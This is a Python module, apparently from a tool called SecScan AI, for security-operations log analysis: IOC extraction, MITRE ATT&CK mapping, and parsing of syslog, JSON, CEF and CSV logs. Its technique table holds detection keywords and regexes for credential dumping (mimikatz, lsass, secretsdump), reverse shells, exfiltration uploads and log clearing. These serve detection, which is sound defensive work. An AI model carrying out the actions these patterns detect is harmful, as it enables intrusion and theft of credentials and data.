#!/usr/bin/env python3
# SecScan AI core module
"""
Advanced SOC (Security Operations Center) Analysis Engine for SecScan AI

Provides enterprise-grade SOC capabilities:
- Multi-format log ingestion & normalization (syslog, JSON, CEF, CSV, Windows Event)
- MITRE ATT&CK framework mapping with tactic/technique identification
- Indicator of Compromise (IOC) extraction (IPs, domains, hashes, emails, URLs)
- Alert correlation engine with sliding-window deduplication
- Threat intelligence enrichment (abuse databases, reputation scoring)
- Statistical anomaly detection (z-score, IQR, baseline deviation)
- Incident timeline reconstruction with kill-chain mapping
- Automated playbook generation for incident response
- Severity scoring aligned with CVSS / SOC triage standards
"""

import re
import json
import math
import hashlib
import logging
import ipaddress
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import Counter, defaultdict
import uuid


def _utc_now() -> datetime:
    """Return timezone-aware UTC datetime."""
    return datetime.now(timezone.utc)


# ---------------------------------------------------------------------------
# Enums & Data Classes
# ---------------------------------------------------------------------------

class ThreatSeverity(Enum):
    """SOC alert severity levels aligned with industry standards."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFORMATIONAL = "informational"


class LogFormat(Enum):
    """Supported log source formats."""
    SYSLOG = "syslog"
    JSON = "json"
    CEF = "cef"
    CSV = "csv"
    WINDOWS_EVENT = "windows_event"
    FIREWALL = "firewall"
    IDS_IPS = "ids_ips"
    AUTO = "auto"


class IncidentStatus(Enum):
    """Incident lifecycle statuses."""
    NEW = "new"
    TRIAGED = "triaged"
    INVESTIGATING = "investigating"
    CONTAINED = "contained"
    ERADICATED = "eradicated"
    RECOVERED = "recovered"
    CLOSED = "closed"


class MitreAttackTactic(Enum):
    """MITRE ATT&CK tactics (Enterprise)."""
    RECONNAISSANCE = "TA0043"
    RESOURCE_DEVELOPMENT = "TA0042"
    INITIAL_ACCESS = "TA0001"
    EXECUTION = "TA0002"
    PERSISTENCE = "TA0003"
    PRIVILEGE_ESCALATION = "TA0004"
    DEFENSE_EVASION = "TA0005"
    CREDENTIAL_ACCESS = "TA0006"
    DISCOVERY = "TA0007"
    LATERAL_MOVEMENT = "TA0008"
    COLLECTION = "TA0009"
    COMMAND_AND_CONTROL = "TA0011"
    EXFILTRATION = "TA0010"
    IMPACT = "TA0040"


@dataclass
class MitreMapping:
    """Maps an observable event to a MITRE ATT&CK technique."""
    tactic: str
    tactic_id: str
    technique: str
    technique_id: str
    sub_technique: Optional[str] = None
    sub_technique_id: Optional[str] = None
    confidence: float = 0.0
    evidence: str = ""


@dataclass
class IOCResult:
    """An extracted Indicator of Compromise."""
    ioc_type: str          # ip, domain, hash_md5, hash_sha1, hash_sha256, email, url, cve
    value: str
    context: str           # surrounding text / log line
    confidence: float
    source_line: int = 0
    threat_score: float = 0.0
    tags: List[str] = field(default_factory=list)


@dataclass
class NormalizedLogEntry:
    """A log entry normalized to a common schema."""
    timestamp: Optional[datetime]
    source: str
    source_ip: Optional[str]
    destination_ip: Optional[str]
    source_port: Optional[int]
    destination_port: Optional[int]
    protocol: Optional[str]
    action: Optional[str]
    severity: Optional[str]
    message: str
    raw: str
    event_type: Optional[str] = None
    user: Optional[str] = None
    hostname: Optional[str] = None
    process: Optional[str] = None
    pid: Optional[int] = None
    log_format: str = "unknown"
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SOCAlert:
    """A correlated SOC alert."""
    alert_id: str
    title: str
    description: str
    severity: ThreatSeverity
    category: str
    source_events: List[NormalizedLogEntry]
    iocs: List[IOCResult]
    mitre_mappings: List[MitreMapping]
    timestamp: datetime
    score: float = 0.0
    false_positive_probability: float = 0.0
    recommended_actions: List[str] = field(default_factory=list)
    status: str = "new"


@dataclass
class AnomalyResult:
    """Result from anomaly detection analysis."""
    metric_name: str
    current_value: float
    baseline_mean: float
    baseline_std: float
    z_score: float
    is_anomaly: bool
    severity: ThreatSeverity
    description: str
    timestamp: Optional[datetime] = None


@dataclass
class IncidentTimeline:
    """Reconstructed incident timeline entry."""
    timestamp: datetime
    event_type: str
    description: str
    source: str
    severity: ThreatSeverity
    mitre_tactic: Optional[str] = None
    mitre_technique: Optional[str] = None
    artifacts: List[str] = field(default_factory=list)


@dataclass
class Playbook:
    """Automated incident response playbook."""
    playbook_id: str
    title: str
    description: str
    incident_type: str
    severity: ThreatSeverity
    steps: List[Dict[str, Any]]
    mitre_tactics: List[str]
    estimated_time_minutes: int
    created_at: datetime = field(default_factory=_utc_now)
    tags: List[str] = field(default_factory=list)


@dataclass
class SOCAnalysisReport:
    """Complete SOC analysis report."""
    report_id: str
    analysis_timestamp: datetime
    total_logs_processed: int
    total_alerts: int
    critical_alerts: int
    high_alerts: int
    medium_alerts: int
    low_alerts: int
    iocs_extracted: int
    anomalies_detected: int
    mitre_techniques_identified: int
    alerts: List[SOCAlert]
    iocs: List[IOCResult]
    anomalies: List[AnomalyResult]
    timeline: List[IncidentTimeline]
    playbooks: List[Playbook]
    risk_score: float
    executive_summary: str
    recommendations: List[str]


# ---------------------------------------------------------------------------
# IOC Extraction Engine
# ---------------------------------------------------------------------------

class IOCExtractor:
    """Extracts Indicators of Compromise from raw text and log entries."""

    # Compiled regex patterns for performance
    PATTERNS = {
        'ip': re.compile(
            r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
            r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'
        ),
        'ipv6': re.compile(
            r'\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b'
            r'|(?:[0-9a-fA-F]{1,4}:){1,7}:'
            r'|::(?:[0-9a-fA-F]{1,4}:){0,6}[0-9a-fA-F]{1,4}'
        ),
        'domain': re.compile(
            r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)'
            r'+(?:com|net|org|edu|gov|mil|io|co|info|biz|xyz|top|'
            r'ru|cn|tk|de|uk|fr|nl|br|za|in|au|us|ca|eu|onion)\b'
        ),
        'url': re.compile(
            r'https?://[^\s\"\'\<\>\)\]}{,]+'
        ),
        'hash_md5': re.compile(r'\b[0-9a-fA-F]{32}\b'),
        'hash_sha1': re.compile(r'\b[0-9a-fA-F]{40}\b'),
        'hash_sha256': re.compile(r'\b[0-9a-fA-F]{64}\b'),
        'email': re.compile(
            r'\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b'
        ),
        'cve': re.compile(r'\bCVE-\d{4}-\d{4,7}\b', re.IGNORECASE),
        'mac_address': re.compile(
            r'\b(?:[0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}\b'
        ),
        'registry_key': re.compile(
            r'\b(?:HKEY_[A-Z_]+\\[^\s]+)\b'
        ),
        'file_path_windows': re.compile(
            r'[A-Z]:\\(?:[^\\\s]+\\)*[^\\\s]+'
        ),
        'file_path_unix': re.compile(
            r'(?:^|\s)/(?:[^\s/]+/)*[^\s/]+'
        ),
    }

    # Well-known private / reserved IP ranges to exclude from threat IOCs
    PRIVATE_RANGES = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('169.254.0.0/16'),
        ipaddress.ip_network('0.0.0.0/8'),
    ]

    # Known benign domains to reduce false positives
    BENIGN_DOMAINS = {
        'google.com', 'microsoft.com', 'apple.com', 'amazonaws.com',
        'cloudflare.com', 'github.com', 'ubuntu.com', 'debian.org',
        'kernel.org', 'python.org', 'mozilla.org', 'example.com',
        'localhost', 'localdomain',
    }

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.IOCExtractor')

    def extract_all(self, text: str, line_number: int = 0) -> List[IOCResult]:
        """Extract all IOC types from text."""
        iocs: List[IOCResult] = []
        seen: Set[Tuple[str, str]] = set()

        for ioc_type, pattern in self.PATTERNS.items():
            for match in pattern.finditer(text):
                value = match.group(0).strip().rstrip('.,;:')
                key = (ioc_type, value.lower())
                if key in seen:
                    continue
                seen.add(key)

                confidence = self._assess_confidence(ioc_type, value)
                if confidence < 0.1:
                    continue

                context = text[max(0, match.start() - 50):match.end() + 50]
                threat_score = self._compute_threat_score(ioc_type, value)

                iocs.append(IOCResult(
                    ioc_type=ioc_type,
                    value=value,
                    context=context.strip(),
                    confidence=confidence,
                    source_line=line_number,
                    threat_score=threat_score,
                    tags=self._generate_tags(ioc_type, value),
                ))
        return iocs

    def extract_from_logs(self, log_entries: List[NormalizedLogEntry]) -> List[IOCResult]:
        """Extract IOCs from a batch of normalized log entries."""
        all_iocs: List[IOCResult] = []
        seen: Set[Tuple[str, str]] = set()

        for idx, entry in enumerate(log_entries):
            entry_iocs = self.extract_all(entry.raw, line_number=idx)
            for ioc in entry_iocs:
                key = (ioc.ioc_type, ioc.value.lower())
                if key not in seen:
                    seen.add(key)
                    all_iocs.append(ioc)
        return all_iocs

    def _assess_confidence(self, ioc_type: str, value: str) -> float:
        """Assess the confidence that a match is a genuine IOC."""
        if ioc_type == 'ip':
            try:
                addr = ipaddress.ip_address(value)
                if any(addr in net for net in self.PRIVATE_RANGES):
                    return 0.3   # private IPs are low-confidence threats
                return 0.85
            except ValueError:
                return 0.0

        if ioc_type == 'domain':
            lower = value.lower()
            if any(lower.endswith('.' + d) or lower == d for d in self.BENIGN_DOMAINS):
                return 0.15
            if lower.endswith('.onion'):
                return 0.95
            return 0.75

        if ioc_type in ('hash_md5', 'hash_sha1', 'hash_sha256'):
            # Reject hashes that are all zeros / trivial
            if len(set(value.lower())) <= 2:
                return 0.1
            return 0.9

        if ioc_type == 'cve':
            return 0.95

        if ioc_type == 'url':
            return 0.8

        if ioc_type == 'email':
            return 0.7

        return 0.5

    def _compute_threat_score(self, ioc_type: str, value: str) -> float:
        """Compute a 0-10 threat score for an IOC."""
        base_scores = {
            'ip': 5.0, 'ipv6': 5.0, 'domain': 4.0, 'url': 5.5,
            'hash_md5': 6.0, 'hash_sha1': 6.0, 'hash_sha256': 6.5,
            'email': 3.0, 'cve': 7.0, 'mac_address': 2.0,
            'registry_key': 4.5, 'file_path_windows': 3.5,
            'file_path_unix': 3.5,
        }
        score = base_scores.get(ioc_type, 3.0)

        # Boost for suspicious patterns
        lower = value.lower()
        if ioc_type == 'domain' and lower.endswith('.onion'):
            score += 3.0
        if ioc_type == 'ip':
            try:
                addr = ipaddress.ip_address(value)
                if not addr.is_private:
                    score += 1.5
            except ValueError:
                pass
        if ioc_type == 'url' and ('pastebin' in lower or 'raw' in lower):
            score += 1.5

        return min(score, 10.0)

    def _generate_tags(self, ioc_type: str, value: str) -> List[str]:
        """Generate contextual tags for an IOC."""
        tags = [ioc_type]
        lower = value.lower()

        if ioc_type == 'ip':
            try:
                addr = ipaddress.ip_address(value)
                tags.append('internal' if addr.is_private else 'external')
            except ValueError:
                pass

        if ioc_type == 'domain':
            if lower.endswith('.onion'):
                tags.append('tor')
            if any(s in lower for s in ('dyn', 'no-ip', 'ddns')):
                tags.append('dynamic_dns')

        if ioc_type == 'cve':
            tags.append('vulnerability')

        if ioc_type in ('hash_md5', 'hash_sha1', 'hash_sha256'):
            tags.append('file_hash')

        return tags


# ---------------------------------------------------------------------------
# MITRE ATT&CK Mapping Engine
# ---------------------------------------------------------------------------

class MitreAttackMapper:
    """Maps observed events and indicators to MITRE ATT&CK techniques."""

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.MitreMapper')
        self.technique_db = self._build_technique_database()

    def _build_technique_database(self) -> Dict[str, Dict[str, Any]]:
        """Build the MITRE ATT&CK technique reference database."""
        return {
            # Initial Access
            'T1195': {
                'name': 'Supply Chain Compromise',
                'tactic': 'Initial Access', 'tactic_id': 'TA0001',
                'keywords': ['supply chain', 'backdoor dependency', 'compromised package',
                             'xz backdoor', 'liblzma', 'cve-2024-3094'],
                'log_patterns': [r'(?i)supply.*chain', r'(?i)xz.*backdoor', r'(?i)liblzma', r'(?i)cve-2024-3094'],
            },
            'T1611': {
                'name': 'Escape to Host',
                'tactic': 'Lateral Movement', 'tactic_id': 'TA0008',
                'keywords': ['container escape', 'runc breakout', 'escape to host',
                             'namespace escape', 'cve-2024-21626'],
                'log_patterns': [r'(?i)container.*escape', r'(?i)runc.*breakout', r'(?i)escape.*host', r'(?i)cve-2024-21626'],
            },
            'T1190': {
                'name': 'Exploit Public-Facing Application',
                'tactic': 'Initial Access', 'tactic_id': 'TA0001',
                'keywords': ['exploit', 'rce', 'remote code execution', 'cve-', 'sql injection',
                             'command injection', 'deserialization', 'ssrf', 'webshell'],
                'log_patterns': [r'(?i)exploit', r'(?i)injection', r'(?i)rce',
                                 r'(?i)webshell', r'(?i)reverse.?shell'],
            },
            'T1566': {
                'name': 'Phishing',
                'tactic': 'Initial Access', 'tactic_id': 'TA0001',
                'keywords': ['phishing', 'spear phishing', 'malicious attachment',
                             'suspicious email', 'credential harvest'],
                'log_patterns': [r'(?i)phish', r'(?i)malicious.*(?:attach|link)',
                                 r'(?i)credential.*harvest'],
            },
            'T1078': {
                'name': 'Valid Accounts',
                'tactic': 'Initial Access', 'tactic_id': 'TA0001',
                'keywords': ['valid account', 'compromised credential', 'stolen credential',
                             'unauthorized login', 'account takeover'],
                'log_patterns': [r'(?i)unauthorized.*login', r'(?i)failed.*login',
                                 r'(?i)brute.?force', r'(?i)credential.*stuf'],
            },
            # Execution
            'T1059': {
                'name': 'Command and Scripting Interpreter',
                'tactic': 'Execution', 'tactic_id': 'TA0002',
                'keywords': ['powershell', 'cmd.exe', 'bash', 'python', 'script execution',
                             'wscript', 'cscript', 'mshta'],
                'log_patterns': [r'(?i)powershell', r'(?i)cmd\.exe',
                                 r'(?i)bash\s+-c', r'(?i)wscript|cscript|mshta',
                                 r'(?i)invoke-expression', r'(?i)iex\s*\('],
            },
            'T1203': {
                'name': 'Exploitation for Client Execution',
                'tactic': 'Execution', 'tactic_id': 'TA0002',
                'keywords': ['client exploit', 'browser exploit', 'office macro',
                             'document exploit'],
                'log_patterns': [r'(?i)macro.*enabled', r'(?i)exploit.*client',
                                 r'(?i)heap.?spray'],
            },
            # Persistence
            'T1053': {
                'name': 'Scheduled Task/Job',
                'tactic': 'Persistence', 'tactic_id': 'TA0003',
                'keywords': ['scheduled task', 'cron job', 'at job', 'schtasks',
                             'systemd timer'],
                'log_patterns': [r'(?i)schtasks', r'(?i)crontab', r'(?i)at\s+\d',
                                 r'(?i)scheduled.*task.*creat'],
            },
            'T1547': {
                'name': 'Boot or Logon Autostart Execution',
                'tactic': 'Persistence', 'tactic_id': 'TA0003',
                'keywords': ['autostart', 'startup', 'registry run key', 'init.d',
                             'systemd service', 'login hook'],
                'log_patterns': [r'(?i)HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                                 r'(?i)rc\.local', r'(?i)systemctl.*enable'],
            },
            # Privilege Escalation
            'T1548': {
                'name': 'Abuse Elevation Control Mechanism',
                'tactic': 'Privilege Escalation', 'tactic_id': 'TA0004',
                'keywords': ['sudo', 'uac bypass', 'setuid', 'privilege escalation',
                             'runas', 'doas'],
                'log_patterns': [r'(?i)sudo.*NOPASSWD', r'(?i)uac.*bypass',
                                 r'(?i)setuid', r'(?i)priv.*escal'],
            },
            'T1068': {
                'name': 'Exploitation for Privilege Escalation',
                'tactic': 'Privilege Escalation', 'tactic_id': 'TA0004',
                'keywords': ['kernel exploit', 'local privilege escalation', 'lpe',
                             'dirty pipe', 'dirty cow', 'polkit'],
                'log_patterns': [r'(?i)kernel.*exploit', r'(?i)dirty.?(?:pipe|cow)',
                                 r'(?i)privilege.*escalat.*local'],
            },
            # Defense Evasion
            'T1070': {
                'name': 'Indicator Removal',
                'tactic': 'Defense Evasion', 'tactic_id': 'TA0005',
                'keywords': ['log deletion', 'log tampering', 'clear event log',
                             'timestomp', 'history clear'],
                'log_patterns': [r'(?i)clear.*event.*log', r'(?i)wevtutil\s+cl',
                                 r'(?i)rm\s+.*\.log', r'(?i)history.*-c'],
            },
            'T1027': {
                'name': 'Obfuscated Files or Information',
                'tactic': 'Defense Evasion', 'tactic_id': 'TA0005',
                'keywords': ['obfuscation', 'encoded payload', 'base64', 'packing',
                             'encryption', 'steganography'],
                'log_patterns': [r'(?i)base64.*decode', r'(?i)obfuscat',
                                 r'(?i)packed.*binary', r'(?i)-enc\s+'],
            },
            # Credential Access
            'T1110': {
                'name': 'Brute Force',
                'tactic': 'Credential Access', 'tactic_id': 'TA0006',
                'keywords': ['brute force', 'password spray', 'credential stuffing',
                             'dictionary attack', 'hydra', 'medusa'],
                'log_patterns': [r'(?i)brute.?force', r'(?i)password.*spray',
                                 r'(?i)failed.*(?:login|auth).*(?:\d{2,})',
                                 r'(?i)credential.*stuff'],
            },
            'T1003': {
                'name': 'OS Credential Dumping',
                'tactic': 'Credential Access', 'tactic_id': 'TA0006',
                'keywords': ['mimikatz', 'credential dump', 'lsass', 'hashdump',
                             'sam database', 'ntds.dit', 'secretsdump'],
                'log_patterns': [r'(?i)mimikatz', r'(?i)lsass.*dump',
                                 r'(?i)hashdump', r'(?i)ntds\.dit',
                                 r'(?i)secretsdump'],
            },
            # Discovery
            'T1046': {
                'name': 'Network Service Discovery',
                'tactic': 'Discovery', 'tactic_id': 'TA0007',
                'keywords': ['port scan', 'nmap', 'service scan', 'network sweep',
                             'masscan', 'zmap'],
                'log_patterns': [r'(?i)nmap', r'(?i)port.*scan', r'(?i)masscan',
                                 r'(?i)SYN.*scan', r'(?i)service.*discover'],
            },
            'T1087': {
                'name': 'Account Discovery',
                'tactic': 'Discovery', 'tactic_id': 'TA0007',
                'keywords': ['account enumeration', 'user enumeration', 'net user',
                             'ldapsearch', 'whoami', 'id'],
                'log_patterns': [r'(?i)net\s+user', r'(?i)ldapsearch',
                                 r'(?i)enum.*user', r'(?i)whoami'],
            },
            # Lateral Movement
            'T1021': {
                'name': 'Remote Services',
                'tactic': 'Lateral Movement', 'tactic_id': 'TA0008',
                'keywords': ['ssh', 'rdp', 'smb', 'winrm', 'psexec',
                             'lateral movement', 'remote desktop'],
                'log_patterns': [r'(?i)psexec', r'(?i)wmiexec',
                                 r'(?i)lateral.*move', r'(?i)remote.*(?:ssh|rdp|smb)'],
            },
            'T1570': {
                'name': 'Lateral Tool Transfer',
                'tactic': 'Lateral Movement', 'tactic_id': 'TA0008',
                'keywords': ['tool transfer', 'scp', 'rsync', 'bitsadmin',
                             'certutil download'],
                'log_patterns': [r'(?i)certutil.*-urlcache', r'(?i)bitsadmin.*transfer',
                                 r'(?i)scp\s+.*@'],
            },
            # Collection
            'T1005': {
                'name': 'Data from Local System',
                'tactic': 'Collection', 'tactic_id': 'TA0009',
                'keywords': ['data collection', 'file access', 'sensitive file',
                             'database dump', 'archive creation'],
                'log_patterns': [r'(?i)tar\s+.*-czf', r'(?i)7z\s+a\s+',
                                 r'(?i)rar\s+a\s+', r'(?i)zip\s+.*-r'],
            },
            # Command & Control
            'T1071': {
                'name': 'Application Layer Protocol',
                'tactic': 'Command and Control', 'tactic_id': 'TA0011',
                'keywords': ['c2', 'command and control', 'beacon', 'cobalt strike',
                             'dns tunnel', 'http tunnel', 'reverse shell'],
                'log_patterns': [r'(?i)cobalt.*strike', r'(?i)beacon',
                                 r'(?i)dns.*tunnel', r'(?i)reverse.*shell',
                                 r'(?i)c2.*server'],
            },
            'T1572': {
                'name': 'Protocol Tunneling',
                'tactic': 'Command and Control', 'tactic_id': 'TA0011',
                'keywords': ['tunnel', 'ssh tunnel', 'icmp tunnel', 'dns over https',
                             'doh', 'vpn tunnel', 'proxy'],
                'log_patterns': [r'(?i)ssh.*-[LRD]', r'(?i)icmp.*tunnel',
                                 r'(?i)doh|dns.*over.*https'],
            },
            # Exfiltration
            'T1048': {
                'name': 'Exfiltration Over Alternative Protocol',
                'tactic': 'Exfiltration', 'tactic_id': 'TA0010',
                'keywords': ['exfiltration', 'data exfil', 'dns exfil',
                             'icmp exfil', 'ftp upload', 'cloud upload'],
                'log_patterns': [r'(?i)exfiltrat', r'(?i)data.*(?:leak|theft)',
                                 r'(?i)unauthorized.*upload', r'(?i)curl.*-T'],
            },
            'T1567': {
                'name': 'Exfiltration Over Web Service',
                'tactic': 'Exfiltration', 'tactic_id': 'TA0010',
                'keywords': ['cloud storage upload', 'dropbox', 'google drive',
                             'mega upload', 'pastebin'],
                'log_patterns': [r'(?i)dropbox', r'(?i)drive\.google',
                                 r'(?i)mega\.nz', r'(?i)pastebin\.com'],
            },
            # Impact
            'T1486': {
                'name': 'Data Encrypted for Impact',
                'tactic': 'Impact', 'tactic_id': 'TA0040',
                'keywords': ['ransomware', 'encryption', 'file encrypted',
                             'ransom note', 'bitcoin demand'],
                'log_patterns': [r'(?i)ransomware', r'(?i)ransom.*note',
                                 r'(?i)files.*encrypted', r'(?i)\.locked$'],
            },
            'T1489': {
                'name': 'Service Stop',
                'tactic': 'Impact', 'tactic_id': 'TA0040',
                'keywords': ['service stop', 'kill process', 'disable service',
                             'denial of service', 'dos'],
                'log_patterns': [r'(?i)service.*stop', r'(?i)kill.*-9',
                                 r'(?i)systemctl.*stop', r'(?i)net\s+stop'],
            },
        }

    def map_event(self, event_text: str) -> List[MitreMapping]:
        """Map a single event/log line to MITRE ATT&CK techniques."""
        mappings: List[MitreMapping] = []
        lower = event_text.lower()

        for tech_id, tech_info in self.technique_db.items():
            confidence = 0.0

            # Keyword matching
            keyword_hits = sum(1 for kw in tech_info['keywords'] if kw in lower)
            if keyword_hits > 0:
                confidence += min(keyword_hits * 0.2, 0.6)

            # Pattern matching
            for pattern in tech_info['log_patterns']:
                if re.search(pattern, event_text):
                    confidence += 0.3
                    break

            if confidence >= 0.2:
                mappings.append(MitreMapping(
                    tactic=tech_info['tactic'],
                    tactic_id=tech_info['tactic_id'],
                    technique=tech_info['name'],
                    technique_id=tech_id,
                    confidence=min(confidence, 1.0),
                    evidence=event_text[:200],
                ))

        # Sort by confidence descending
        mappings.sort(key=lambda m: m.confidence, reverse=True)
        return mappings[:5]  # top 5 matches

    def map_iocs(self, iocs: List[IOCResult]) -> List[MitreMapping]:
        """Map extracted IOCs to likely MITRE ATT&CK techniques."""
        mappings: List[MitreMapping] = []

        for ioc in iocs:
            if ioc.ioc_type == 'cve':
                mappings.append(MitreMapping(
                    tactic='Initial Access', tactic_id='TA0001',
                    technique='Exploit Public-Facing Application',
                    technique_id='T1190', confidence=0.85,
                    evidence=f"CVE reference: {ioc.value}",
                ))
            elif ioc.ioc_type in ('hash_md5', 'hash_sha1', 'hash_sha256'):
                mappings.append(MitreMapping(
                    tactic='Execution', tactic_id='TA0002',
                    technique='Malicious File Execution',
                    technique_id='T1204.002', confidence=0.6,
                    evidence=f"File hash: {ioc.value}",
                ))
            elif ioc.ioc_type == 'domain' and 'tor' in ioc.tags:
                mappings.append(MitreMapping(
                    tactic='Command and Control', tactic_id='TA0011',
                    technique='Application Layer Protocol',
                    technique_id='T1071', confidence=0.8,
                    evidence=f"Tor domain: {ioc.value}",
                ))
            elif ioc.ioc_type == 'ip' and 'external' in ioc.tags:
                if ioc.threat_score >= 6.0:
                    mappings.append(MitreMapping(
                        tactic='Command and Control', tactic_id='TA0011',
                        technique='Application Layer Protocol',
                        technique_id='T1071', confidence=0.5,
                        evidence=f"Suspicious external IP: {ioc.value}",
                    ))

        return mappings


# ---------------------------------------------------------------------------
# Log Parser & Normalizer
# ---------------------------------------------------------------------------

class LogParser:
    """Multi-format log parser and normalizer."""

    SYSLOG_PATTERN = re.compile(
        r'^(?P<timestamp>\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+'
        r'(?P<hostname>\S+)\s+'
        r'(?P<process>\S+?)(?:\[(?P<pid>\d+)\])?\s*:\s*'
        r'(?P<message>.+)$'
    )

    CEF_PATTERN = re.compile(
        r'^CEF:\d+\|(?P<vendor>[^|]*)\|(?P<product>[^|]*)\|(?P<version>[^|]*)\|'
        r'(?P<event_id>[^|]*)\|(?P<name>[^|]*)\|(?P<severity>[^|]*)\|'
        r'(?P<extensions>.*)$'
    )

    FIREWALL_PATTERN = re.compile(
        r'(?:SRC|src)=(?P<src_ip>[\d.]+).*?'
        r'(?:DST|dst)=(?P<dst_ip>[\d.]+).*?'
        r'(?:SPT|spt)=(?P<src_port>\d+).*?'
        r'(?:DPT|dpt)=(?P<dst_port>\d+).*?'
        r'(?:PROTO|proto)=(?P<proto>\w+)',
        re.IGNORECASE
    )

    WINDOWS_EVENT_KEYWORDS = [
        'EventID', 'event_id', 'TargetUserName', 'LogonType',
        'SubjectUserName', 'IpAddress', 'WorkstationName',
    ]

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.LogParser')

    def detect_format(self, line: str) -> LogFormat:
        """Auto-detect log format from a line."""
        stripped = line.strip()

        if stripped.startswith('{') and stripped.endswith('}'):
            return LogFormat.JSON

        if stripped.startswith('CEF:'):
            return LogFormat.CEF

        if self.SYSLOG_PATTERN.match(stripped):
            return LogFormat.SYSLOG

        if any(kw in stripped for kw in self.WINDOWS_EVENT_KEYWORDS):
            return LogFormat.WINDOWS_EVENT

        if self.FIREWALL_PATTERN.search(stripped):
            return LogFormat.FIREWALL

        if ',' in stripped and stripped.count(',') >= 3:
            return LogFormat.CSV

        return LogFormat.SYSLOG  # fallback

    def parse_line(self, line: str, fmt: LogFormat = LogFormat.AUTO) -> NormalizedLogEntry:
        """Parse a single log line into a normalized entry."""
        if fmt == LogFormat.AUTO:
            fmt = self.detect_format(line)

        parsers = {
            LogFormat.SYSLOG: self._parse_syslog,
            LogFormat.JSON: self._parse_json,
            LogFormat.CEF: self._parse_cef,
            LogFormat.CSV: self._parse_csv,
            LogFormat.WINDOWS_EVENT: self._parse_windows_event,
            LogFormat.FIREWALL: self._parse_firewall,
            LogFormat.IDS_IPS: self._parse_ids,
        }

        parser = parsers.get(fmt, self._parse_generic)
        try:
            entry = parser(line)
            entry.log_format = fmt.value
            return entry
        except Exception as e:
            self.logger.debug("Parse error for format %s: %s", fmt, e)
            return self._parse_generic(line)

    def parse_bulk(self, raw_logs: str, fmt: LogFormat = LogFormat.AUTO) -> List[NormalizedLogEntry]:
        """Parse multiple log lines."""
        entries: List[NormalizedLogEntry] = []
        for line in raw_logs.strip().splitlines():
            line = line.strip()
            if not line:
                continue
            entries.append(self.parse_line(line, fmt))
        return entries

    # -- Format-specific parsers --

    def _parse_syslog(self, line: str) -> NormalizedLogEntry:
        match = self.SYSLOG_PATTERN.match(line)
        if match:
            gd = match.groupdict()
            ts = self._parse_timestamp(gd.get('timestamp', ''))
            return NormalizedLogEntry(
                timestamp=ts,
                source='syslog',
                source_ip=None,
                destination_ip=None,
                source_port=None,
                destination_port=None,
                protocol=None,
                action=None,
                severity=None,
                message=gd.get('message', line),
                raw=line,
                hostname=gd.get('hostname'),
                process=gd.get('process'),
                pid=int(gd['pid']) if gd.get('pid') else None,
            )
        return self._parse_generic(line)

    def _parse_json(self, line: str) -> NormalizedLogEntry:
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            return self._parse_generic(line)

        ts_raw = data.get('timestamp') or data.get('@timestamp') or data.get('time') or data.get('date')
        ts = self._parse_timestamp(str(ts_raw)) if ts_raw else None

        return NormalizedLogEntry(
            timestamp=ts,
            source=data.get('source', data.get('log_source', 'json')),
            source_ip=data.get('src_ip', data.get('source_ip', data.get('srcip'))),
            destination_ip=data.get('dst_ip', data.get('dest_ip', data.get('dstip'))),
            source_port=self._safe_int(data.get('src_port', data.get('source_port'))),
            destination_port=self._safe_int(data.get('dst_port', data.get('dest_port'))),
            protocol=data.get('protocol', data.get('proto')),
            action=data.get('action', data.get('event_action')),
            severity=data.get('severity', data.get('level', data.get('priority'))),
            message=data.get('message', data.get('msg', json.dumps(data))),
            raw=line,
            event_type=data.get('event_type', data.get('type')),
            user=data.get('user', data.get('username', data.get('account'))),
            hostname=data.get('hostname', data.get('host', data.get('computer'))),
            process=data.get('process', data.get('application')),
            pid=self._safe_int(data.get('pid', data.get('process_id'))),
            metadata={k: v for k, v in data.items() if k not in (
                'timestamp', 'source', 'src_ip', 'dst_ip', 'message')},
        )

    def _parse_cef(self, line: str) -> NormalizedLogEntry:
        match = self.CEF_PATTERN.match(line)
        if not match:
            return self._parse_generic(line)

        gd = match.groupdict()
        extensions = self._parse_cef_extensions(gd.get('extensions', ''))

        return NormalizedLogEntry(
            timestamp=self._parse_timestamp(extensions.get('rt', extensions.get('end', ''))),
            source=f"{gd.get('vendor', '')}:{gd.get('product', '')}",
            source_ip=extensions.get('src'),
            destination_ip=extensions.get('dst'),
            source_port=self._safe_int(extensions.get('spt')),
            destination_port=self._safe_int(extensions.get('dpt')),
            protocol=extensions.get('proto'),
            action=extensions.get('act', gd.get('name')),
            severity=gd.get('severity'),
            message=gd.get('name', line),
            raw=line,
            event_type=gd.get('event_id'),
            user=extensions.get('suser', extensions.get('duser')),
            hostname=extensions.get('shost', extensions.get('dhost')),
            metadata=extensions,
        )

    def _parse_csv(self, line: str) -> NormalizedLogEntry:
        parts = line.split(',')
        return NormalizedLogEntry(
            timestamp=self._parse_timestamp(parts[0].strip()) if parts else None,
            source='csv',
            source_ip=parts[1].strip() if len(parts) > 1 else None,
            destination_ip=parts[2].strip() if len(parts) > 2 else None,
            source_port=self._safe_int(parts[3].strip()) if len(parts) > 3 else None,
            destination_port=self._safe_int(parts[4].strip()) if len(parts) > 4 else None,
            protocol=parts[5].strip() if len(parts) > 5 else None,
            action=parts[6].strip() if len(parts) > 6 else None,
            severity=parts[7].strip() if len(parts) > 7 else None,
            message=','.join(parts[8:]).strip() if len(parts) > 8 else line,
            raw=line,
        )

